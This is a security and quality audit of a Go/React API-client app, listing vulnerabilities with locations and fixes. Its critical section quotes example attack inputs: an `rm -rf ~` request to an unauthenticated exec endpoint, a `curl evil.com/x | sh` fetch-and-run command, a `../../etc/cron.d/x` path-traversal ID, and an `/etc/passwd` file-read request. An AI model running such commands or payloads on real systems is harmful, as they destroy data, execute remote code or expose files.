# GoPost — Production Readiness Audit

Audit date: 2026-06-20. Scope: full repo (Go backend, React/Vite frontend, CLI runner, Wails packaging, CI).

Items are ordered by severity. Each entry has:

- **Where** — exact file and line(s)
- **Problem** — concrete description and impact
- **Fix** — what to change

---

## CRITICAL — block release

### C1. Saving a request bakes the environment substitution into the stored value

- **Where**: `frontend/src/components/RequestEditor.jsx:208-298` (`applyEnv`, `effectiveURL`, `upsertRequest`)
- **Problem**: `upsertRequest` computes `u = effectiveURL` (env-substituted), `b = applyEnv(body)`, `h = mapHeaders()` (also substituted) and passes those to `api.UpdateRequest`. Both `handleSend` and `handleSave` go through `upsertRequest`. Result: a request authored as `GET {{baseUrl}}/users` is persisted to disk as `GET https://api.example.com/users` the first time it is sent/saved. Switching environments stops working from then on, and secret tokens stored in env vars get written into `request_headers` JSON files.
- **Fix**: Substitute only when building the HTTP call. Save the raw `url`, `body`, `headers`. The runner already does it correctly (`app/pkg/runner/runner.go:302`). Either:
  1. Stop pre-substituting in `upsertRequest` and move substitution into the backend `ExecuteRequest` (preferred — single source of truth), or
  2. Keep raw values in state and only substitute in a separate `sendRequest` codepath that does not write back.

### C2. Path traversal via collection / request ID

- **Where**: `app/pkg/storage/gitstore.go:164` (`sanitizeName`) and every call site that uses it as a directory or filename
- **Problem**: `sanitizeName` strips `/ \ : * ? " < > |` but does **not** filter `..`, leading dots, NUL bytes, or absolute paths. `collectionDir`, `mockPath`, `manifestPath`, `requestFileName` all feed user-supplied IDs into `filepath.Join` with the base dir. An attacker (or a buggy import) that controls a collection ID (`"../../etc/cron.d/x"`) can write or delete files outside `~/.gopost`. The HTTP API in fallback mode accepts the ID from the URL path (`/api/collections/{id}`), so this is reachable from any browser tab open on the same machine.
- **Fix**:
  1. In `sanitizeName`, reject (or replace) `..`, leading `.`, `\x00`, and any name that resolves outside the base dir.
  2. After `filepath.Join`, call `filepath.Rel(baseDir, joined)` and ensure the result does not start with `..` (or use `filepath-securejoin`, already a transitive dep).
  3. Validate IDs on the HTTP boundary (must be a UUID).

### C3. `/api/exec` is unauthenticated arbitrary shell

- **Where**: `main.go:526-536`, `app/app.go:1468-1491` (`ExecCommand`)
- **Problem**: `POST /api/exec {"command":"rm -rf ~"}` shells out via `sh -c`, no auth, no allowlist, no origin check. Wails binds to `127.0.0.1`, but every browser tab and every other localhost process can reach it. In dev mode (Vite on `:34115` and the Go API on `:5173` or similar) the surface is wider. The only mitigation today is a 10s timeout — useless against `curl evil.com/x | sh`.
- **Fix**:
  1. Delete the endpoint if the GUI doesn’t actually need it (the embedded terminal already uses a separate PTY WebSocket and `TerminalEnabled = false`).
  2. If retained, gate it on `app.features.go` like the terminal, require a per-session token in a header (generated at app start, never reachable from JS in the Wails web view), and reject non-`null`/non-`127.0.0.1` `Origin` headers.

### C4. Terminal WebSocket accepts any origin

- **Where**: `app/terminal.go:93-95`
- **Problem**: `upgrader.CheckOrigin = func(r *http.Request) bool { return true }`. When the terminal feature is on (`app/features.go:4` flip), any web page can open a WebSocket to the random `127.0.0.1:<port>` and get a fully interactive shell with the user's environment. The terminal port is discoverable via `GET /api/term-port` (`main.go:384`), which is also unauthenticated.
- **Fix**: `CheckOrigin` must validate `Origin` against the Wails web view's URL (typically `wails://` or `http://localhost:<vite-port>`). Combine with a per-process secret in the WS path or a `Sec-WebSocket-Protocol`.

### C5. Secrets written with world-readable file mode

- **Where**: `app/pkg/storage/gitstore.go:676`, `app/pkg/storage/storage.go:341`, `app/app.go:525, 726`, `app/pkg/gitops/gitops.go:65`
- **Problem**: Every `os.WriteFile(..., 0644)` produces a file readable by every user on the host. Request files (`*.gopost.json`) contain `auth.token`, `auth.password`, `auth.api_key_value`, env files contain `Variables`. On a multi-user dev machine or a shared CI runner, those leak.
- **Fix**:
  - Files: `0600` for anything that can contain secrets (everything in `~/.gopost`).
  - Directories created with `os.MkdirAll(..., 0700)` instead of `0755`.
  - Bonus: do not log `request.Body` or auth headers in `history.gopost.json` either — at minimum mask them before persisting.

### C6. `/api/import` reads any file the app's user can read

- **Where**: `main.go:336-345`, `app/app.go:555-565` (`ImportData`)
- **Problem**: `POST /api/import {"path":"/etc/passwd"}` causes the server to `os.ReadFile` that path and try to JSON-parse it. With the HTTP fallback active, any localhost JS gets a generic local-file-read primitive (success leaks contents indirectly, errors leak existence/permissions).
- **Fix**: Drop the path-based variant from the HTTP routes; keep only `/api/import-content`, which the UI already uses. The same applies to `/api/export`, which writes to any path.

### C7. `panic(err)` on startup

- **Where**: `main.go:34, 71`
- **Problem**: If `fs.Sub` or `wailsApp.Run` fails the user gets a Go panic stack trace in a terminal they may not see (GUI launch). The app simply dies.
- **Fix**: log the error to a known location (`~/.gopost/gopost.log`) and call `os.Exit(1)` with a one-line error to stderr.

---

## HIGH — fix before next user-facing release

### H1. Hard-coded absolute paths in dev launch scripts

- **Where**: `dev-frontend.sh`, `run.sh`
  - `cd /Users/berksunduri/code/GO/PostGO/frontend`
  - `exec /Users/berksunduri/go/bin/wails3 dev -port 34115`
- **Problem**: only runs on the author's laptop. Anyone cloning the repo gets `cd: no such file or directory`.
- **Fix**:
  - `dev-frontend.sh`: `cd "$(dirname "$0")/frontend"`
  - `run.sh`: use `wails3` from `$PATH` and `cd "$(dirname "$0")"`.

### H2. `Shutdown` leaks WebSocket and SSE goroutines

- **Where**: `app/app.go:1531-1534`
- **Problem**: only stops the mock server. `wsClients` and `sseClients` maps are not iterated. Each open client has a `readLoop`/`readStream` goroutine, a network conn, and a file descriptor that stay alive until the process exits — usually fine on shutdown, but stale connections still receive data into orphan buffers if the process is being suspended/sent SIGTERM during user logout.
- **Fix**:
  ```go
  func (a *App) Shutdown() {
      _ = a.mockServer.Stop()
      a.wsClientsMu.Lock()
      for id, c := range a.wsClients { _ = c.Disconnect(); delete(a.wsClients, id) }
      a.wsClientsMu.Unlock()
      a.sseClientsMu.Lock()
      for id, c := range a.sseClients { _ = c.Disconnect(); delete(a.sseClients, id) }
      a.sseClientsMu.Unlock()
  }
  ```

### H3. `pkg/` directory is dead duplicate code

- **Where**: `pkg/handlers/`, `pkg/models/`, `pkg/storage/`
- **Problem**: pre-migration copies of `app/pkg/...`. Nothing imports them (`pkg/handlers/handlers.go` imports `gopost/pkg/models` and `gopost/pkg/storage`, never used by `main`). Dead code that gets indexed by IDEs, included in test runs, and could be accidentally wired in.
- **Fix**: `rm -rf pkg/` and run `go build ./...` to confirm.

### H4. Legacy `Storage` instance allocated on every startup

- **Where**: `app/app.go:35, 65` (`storage *storage.Storage` field, instantiated as "Legacy storage (for reference)")
- **Problem**: After `MigrateFromLegacy` runs once and renames files to `.legacy.bak`, the field has no purpose but is created on every app launch and held for the process lifetime.
- **Fix**: drop the field. Migration is `MigrateFromLegacy(dataDir)` followed by no further use of the legacy struct.

### H5. `collectEnvVars` always returns empty, breaking script chaining

- **Where**: `app/app.go:1317-1323`
- **Problem**: Pre-request scripts and test scripts receive no env variables (`env = {}`). README and `runner.go` advertise variable substitution as a first-class feature; the chaining flow ("extract value → reuse in next request via env") is broken inside scripts. The comment claims "env vars are applied by the frontend before calling ExecuteRequest" — but `ExecuteRequest` only receives a request ID, never substituted text.
- **Fix**: read the active environment (tracked elsewhere, or pass an env ID through the call) and return a real `map[string]string`. Also: the runner CLI does its own substitution; consolidate to one function.

### H6. Non-atomic file writes — crashes can corrupt user data

- **Where**: every `os.WriteFile` in `app/pkg/storage/gitstore.go` and `storage.go`
- **Problem**: `os.WriteFile` truncates the file before writing. A crash or power loss between truncate and the final write leaves an empty or partial JSON file. Next load fails to parse, and the `loadHistory`-style code silently swallows the error (`json.Unmarshal(data, &history)` with no error check at `gitstore.go:487`). User loses data.
- **Fix**: write-then-rename. Tiny helper:
  ```go
  func writeAtomic(path string, data []byte, perm fs.FileMode) error {
      tmp := path + ".tmp"
      if err := os.WriteFile(tmp, data, perm); err != nil { return err }
      return os.Rename(tmp, path)
  }
  ```
  Use it from `writePrettyJSON` and `saveJSON`.

### H7. `json.Unmarshal` error ignored when loading history

- **Where**: `app/pkg/storage/gitstore.go:487`
- **Problem**: `json.Unmarshal(data, &history)` — error discarded. If the file is corrupt the user sees "no history" silently.
- **Fix**: return the error so the UI can show "History file corrupt — backed up to history.gopost.json.bad".

### H8. Inconsistent and unstructured logging

- **Where**: `app/app.go` uses `fmt.Printf` (no timestamp, no level). `app/pkg/storage/migration.go` uses `log.Println`. `app/pkg/mock/server.go` uses `fmt.Printf`. `app/terminal.go` uses `log.Printf`.
- **Problem**: no levels, no rotation, no structure, no destination file. Production users can't grep "errors only", and there's no way to file a useful bug report.
- **Fix**: standardize on `log/slog` with a `slog.Default()` configured at process start to write JSON to `~/.gopost/gopost.log` and a TEXT handler to stderr in dev. Replace `fmt.Printf("[mock] …")` with `slog.Info("mock server start", "port", port)`.

### H9. `os.MkdirAll` errors silently dropped

- **Where**: `app/pkg/storage/gitstore.go:48, 394, 521, 532`, `app/app.go:27, 716`, `app/pkg/storage/migration.go:71`
- **Problem**: if the directory can't be created (disk full, permission denied, parent missing), every subsequent file write fails with a misleading error. The user sees "request not found" instead of "/.gopost is read-only".
- **Fix**: check the error, surface it. For `NewGitStore`, return `(*GitStore, error)`.

---

## MEDIUM — quality & UX

### M1. UI strings not in the i18n dictionary

- **Where**: `frontend/src/App.jsx`, `frontend/src/components/MockPanel.jsx`, `frontend/src/components/RequestEditor.jsx`
- **Problem**: the user rule says "always use i18n dictionaries". Many user-visible strings are still hard-coded English:
  - App.jsx: "Drop .http file to import", "Supports .http, .rest, and GoPost .json exports", "New Request", `Imported ${count} request...`, `Failed to import ${file.name}`, `Preview: ${result.collections} collections...`, `Extracted ${active.length} variable...`
  - RequestEditor.jsx: "Please enter a URL", "Request saved", "Request failed", "Pre-request script failed", "Test script failed — see Tests tab"
  - MockPanel.jsx: handled mostly, but `title={t("mockCopied")}` is misused (the title is for hover, not the toast).
- **Fix**: move them into `frontend/src/i18n.js`, including parameterized forms (extend `t()` to accept an args object).

### M2. `alert()` used instead of `toast`

- **Where**: `frontend/src/App.jsx:320`
- **Problem**: `alert(t("exportSuccess"))` blocks the main thread and looks out of place next to the Sonner toasts everywhere else.
- **Fix**: `toast.success(t("exportSuccess"))`.

### M3. `ErrorBoundary` exists but is never mounted

- **Where**: `frontend/src/components/ErrorBoundary.jsx`, expected mount in `frontend/src/main.jsx`
- **Problem**: any uncaught render error gives a white screen.
- **Fix**: wrap `<App />`:
  ```jsx
  <ErrorBoundary>
    <App />
  </ErrorBoundary>
  ```

### M4. Excessive `useEffect`

- **Where**: `frontend/src/App.jsx:129-218, 221-233, 236-280`, `frontend/src/context/TabsContext.jsx:87`
- **Problem**: violates the project rule "avoid unnecessary useEffect". Three out of three in `App.jsx`:
  1. Keyboard shortcut listener — **legitimate** (external system: `window`).
  2. Run-report toast — **not legitimate**, this should compute during render via the `useState(prev)` pattern.
  3. Tab restore — **not legitimate**, depends only on data that's already available during render; convert to an "initialize once" via a render-time guard.
- **Fix**: keep only the keyboard listener. Replace 2) with a `useState(prev)` comparison against `lastRunReport`. Replace 3) with a `useRef` flag set inside a normal callback triggered when conditions first become true during render (already partly there with `hasRestoredTabs.current`).

### M5. Mock server CORS reflects any origin and allows credentials

- **Where**: `app/pkg/mock/server.go:259-275`
- **Problem**: for a mock running on `localhost:3001` this is intentional, but the `Allow-Credentials: true` combined with `Allow-Origin: <reflected>` lets any opened-in-browser page send credentialed requests to the mock and read responses. If the user has the mock running with sensitive mock data, any open tab can scrape it.
- **Fix**: opt-in. Default to no `Allow-Credentials`. Provide a setting like `mock.credentialed_origins: ["http://localhost:5173"]`.

### M6. `URL.revokeObjectURL` called immediately after `a.click()`

- **Where**: `frontend/src/App.jsx:313-319`
- **Problem**: in some browsers/scenarios the click-triggered download has not finished initiating before the URL is revoked, producing a failed download with no error.
- **Fix**: defer the revoke: `setTimeout(() => URL.revokeObjectURL(href), 1000)`.

### M7. Mock UI polls every 2–5 seconds instead of subscribing

- **Where**: `frontend/src/context/MockServerContext.jsx:38-53`
- **Problem**: while the mock server is running, two intervals fire forever, even with the panel hidden. Wails has an event bus.
- **Fix**: backend emits `mock:status` on change and `mock:log` on each request; frontend subscribes. Falls back to polling only when not on Wails.

### M8. GraphQL schema cache never expires

- **Where**: `app/app.go:42-43, 894-901`
- **Problem**: `schemaCache map[string]*models.CachedGraphQLSchema` grows unbounded. A power user introspecting hundreds of endpoints leaks memory.
- **Fix**: cap to N entries with simple LRU, or invalidate entries older than 24h. `IntrospectedAt` is already stored.

### M9. History truncated silently to 500 entries

- **Where**: `app/pkg/storage/gitstore.go:466-468`
- **Problem**: above 500 entries the oldest disappear with no UI indication. Users lose evidence they assumed was saved.
- **Fix**: make the cap configurable, write to an archive file when truncating (`history-archive-YYYY-MM.json`), and surface the cap in the History panel.

### M10. CLI runner reads response bodies just to throw them away

- **Where**: `app/pkg/runner/runner.go:109, 295-297`
- **Problem**: `respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))` then `_ = body`. Wastes up to 10 MB of allocation per request when the runner doesn't use the body.
- **Fix**: when the assertion path is empty, use `io.Copy(io.Discard, resp.Body)`. When tests need the body, hand it back.

### M11. `exec.Command("open", ...)` is macOS-only

- **Where**: `app/app.go:731, 1281`
- **Problem**: `ExportCollectionAsHTTPFile` and `RevealInFinder` only work on macOS. README claims Linux/Windows support.
- **Fix**:
  ```go
  func openPath(p string) error {
      switch runtime.GOOS {
      case "darwin":  return exec.Command("open", p).Run()
      case "windows": return exec.Command("cmd", "/c", "start", "", p).Run()
      default:        return exec.Command("xdg-open", p).Run()
      }
  }
  ```

### M12. `runner.DefaultExecutor` is dead code

- **Where**: `app/pkg/runner/runner.go:81-83`
- **Problem**: declared but unused (`Run` builds its own executor with the per-run timeout).
- **Fix**: delete.

### M13. `cmd/gopost/main.go:splitFlags` is dead code

- **Where**: `cmd/gopost/main.go:285-295`
- **Problem**: defined, never called.
- **Fix**: delete.

### M14. Frontend logs to `console.error` in production

- **Where**: `frontend/src/context/{CollectionsContext,EnvironmentsContext,HistoryContext,RequestsContext}.jsx`
- **Problem**: noise in user devtools, no actionable telemetry.
- **Fix**: route through a small `log.js` helper that can be silenced in production builds (`if (import.meta.env.PROD) return`).

### M15. No version embedded in desktop binary

- **Where**: `main.go` has no `var version = "..."` and CI's `release.yml` only injects it into the CLI build (`go build -ldflags "-X main.version=..."`).
- **Problem**: bug reports can't tell which build a user is running.
- **Fix**: add `var version = "dev"` to `main.go` and pass `-X main.version=${{ github.ref_name }}` for the desktop build too. Surface it in the Settings panel.

---

## LOW — hygiene

### L1. `wails.json` `devServer` host hardcoded

- **Where**: `wails.json:5`
- **Problem**: `http://localhost:34115` matches Vite default; harmless but undocumented and duplicated in `Taskfile.yml`, `dev-frontend.sh`, `run.sh`.
- **Fix**: keep one source of truth (e.g., an env var or `vite.config.js` constant).

### L2. Variable substitution is naive `strings.ReplaceAll`

- **Where**: `app/pkg/runner/runner.go:302-312`
- **Problem**: no escaping, no precedence. A value like `{{x}}` for variable `y` will be re-substituted on a future pass if any code ever loops. Currently it doesn't loop, but the function is repeated logic spread across runner/frontend.
- **Fix**: one regex-based substituter in a shared package (`app/pkg/envvars/`), called from both runner and `ExecuteRequest`.

### L3. Integration tests gated behind `//go:build integration` and never run in CI

- **Where**: `main_test.go:1`, `app/app_test.go:1`
- **Problem**: `.github/workflows/ci.yml` runs only `go test ./app/pkg/...`, so HTTP-layer and App-layer tests run nowhere.
- **Fix**: add a CI job `go test -tags integration ./...` on Linux (the comment says they need Wails CGO + macOS frameworks, but the existing test files don't actually import Wails — verify and inline the build tag if so).

### L4. Mock server in `app/pkg/mock` and CLI binaries in `cmd/graphql-mock`, `cmd/testserver` undocumented

- **Where**: `cmd/graphql-mock`, `cmd/testserver`
- **Problem**: not mentioned in README; unclear if they ship or are dev-only.
- **Fix**: doc one-liner in README under a "Development" section, or move to `internal/`.

### L5. `release.yml` pins Go 1.22 but `go.mod` requires Go 1.25

- **Where**: `.github/workflows/release.yml` (`go-version: "1.22"`) vs `go.mod` (`go 1.25.0`)
- **Problem**: release build will fail with "module requires Go 1.25" the next time someone pushes a tag.
- **Fix**: bump to `1.25` (or use `go-version-file: go.mod` like `ci.yml` does).

### L6. Homebrew formula SHA placeholders

- **Where**: `.github/homebrew/gopost.rb` — `sha256 "REPLACE_WITH_ACTUAL_SHA256"`
- **Problem**: as-is the formula will not install.
- **Fix**: the release workflow should `sed` the real SHAs in after building.

### L7. `Taskfile.yml dev:` ignores OS-specific scaffolding

- **Where**: `Taskfile.yml:42-44`
- **Problem**: `build` task uses `{{OS}}:build` but `dev` just calls `wails3 dev`. Consistent or not — pick one.
- **Fix**: either add `dev` per-OS or drop the OS dispatch from `build` too.

### L8. `frontend/dist/` is committed gitignored output? Verify.

- **Where**: `frontend/dist/` exists; `.gitignore` line 36 ignores `frontend/dist/`
- **Problem**: directory exists in checkout (`ls frontend/` shows it). If gitignored after the fact it may still be tracked.
- **Fix**: `git rm -r --cached frontend/dist/`.

### L9. `cmd/gopost/main.go:version = "1.0.0-dev"`

- **Where**: `cmd/gopost/main.go:28`
- **Problem**: hardcoded fallback that survives if `-ldflags -X` is forgotten.
- **Fix**: default to `"dev"` (matches H1 conventions).

---

## Suggested order of attack

1. **Day 1 (security/data)**: C1, C2, C3, C5, C6, C7, H6, H7
2. **Day 2 (correctness)**: C4 (terminal off anyway, but lock the door), H1, H2, H4, H5, H9
3. **Day 3 (quality)**: H3 (delete `pkg/`), H8 (slog), M3 (ErrorBoundary), M2 (alert), M4 (useEffect), M11 (cross-platform open), L5 (Go version)
4. **Backlog**: everything in M (UX polish), L (hygiene)

Estimated effort: ~3 focused days for CRITICAL+HIGH; the M/L items can be folded into normal feature work.
